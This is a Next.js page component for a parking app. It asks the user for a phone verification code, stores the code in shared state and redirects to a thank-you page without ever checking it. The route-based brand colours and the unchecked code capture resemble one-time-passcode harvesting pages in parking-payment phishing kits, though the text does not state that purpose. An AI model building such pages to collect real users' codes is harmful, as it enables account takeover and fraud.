'use client';

import { useEffect, useState } from 'react';
import { useRouter, usePathname } from 'next/navigation';
import { useParking } from '../../context/ParkingContext';

export default function VerifyPhonePage() {
  const { data, setData } = useParking();
  const router = useRouter();
  const pathname = usePathname(); // 👈 Obținem pathname-ul curent

  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [idle, setIdle] = useState(false);

  // Culoare în funcție de URL
  const isGreen = pathname.includes('/c1');
  const isBlue = pathname.includes('/q1');

  const buttonStyle = {
    backgroundColor: isGreen ? '#047857' : isBlue ? '#0172f2' : '#333',
  };

  const spinnerStyle = {
    borderTopColor: isGreen ? '#047857' : isBlue ? '#0172f2' : '#333',
    borderBottomColor: isGreen ? '#047857' : isBlue ? '#0172f2' : '#333',
  };

  useEffect(() => {
    const idleTimer = setTimeout(() => {
      setIdle(true);
    }, 10000); // 10 secunde inactivitate

    return () => clearTimeout(idleTimer);
  }, [code]);

  const maskedPhone = data.phoneNumber
    ? data.phoneNumber.replace(/.(?=.{4})/g, '*')
    : '***';

  const handleVerify = () => {
    if (code.trim().length < 4) {
      setError('Please enter the full verification code.');
      return;
    }

    setError('');
    setData({ verificationCode: code.trim() });
    router.push('/thank-you');
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center text-center px-4 py-8">
      <h1 className="text-xl font-semibold mb-4">Verify Your Phone Number</h1>
      <p className="text-gray-600 mb-6">
        Enter the code sent to <strong>{maskedPhone}</strong>
      </p>

      <input
        type="text"
        value={code}
        onChange={(e) => {
          setCode(e.target.value);
          setIdle(false); // Reset idle la tastare
        }}
        className="w-full max-w-xs border p-2 rounded mb-4"
        placeholder="Enter verification code"
      />
      {error && <p className="text-red-600 text-sm mb-4">{error}</p>}

      <button
        onClick={handleVerify}
        className="text-white px-6 py-2 rounded hover:opacity-90 transition duration-200"
        style={buttonStyle}
      >
        Verify
      </button>

      {idle && (
        <div className="mt-6 flex flex-col items-center text-sm text-gray-500">
          <div
            className="animate-spin h-6 w-6 border-t-2 border-b-2 rounded-full mb-2"
            style={spinnerStyle}
          />
          Waiting for input…
        </div>
      )}
    </div>
  );
}
